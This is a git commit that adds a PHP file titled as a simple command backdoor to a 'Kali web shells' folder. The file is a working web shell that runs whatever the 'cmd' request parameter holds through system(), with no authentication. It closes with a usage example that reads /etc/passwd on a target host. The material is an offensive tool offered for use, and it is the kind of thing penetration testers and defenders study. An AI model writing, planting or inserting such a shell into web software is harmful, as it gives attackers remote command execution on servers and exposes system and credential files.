aa2850b1e60d738a3f9de3591e05dccecd2d1a76
Rayferrufino <52383730+Rayferrufino@users.noreply.github.com>
2019-08-12 16:38:21 -0400

    Create simple php cmd backdoor.php

---
+++ Kali web shells/simple php cmd backdoor.php
@@ -0,0 +1,17 @@
+
+
+<?php
+
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+
+?>
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+
+
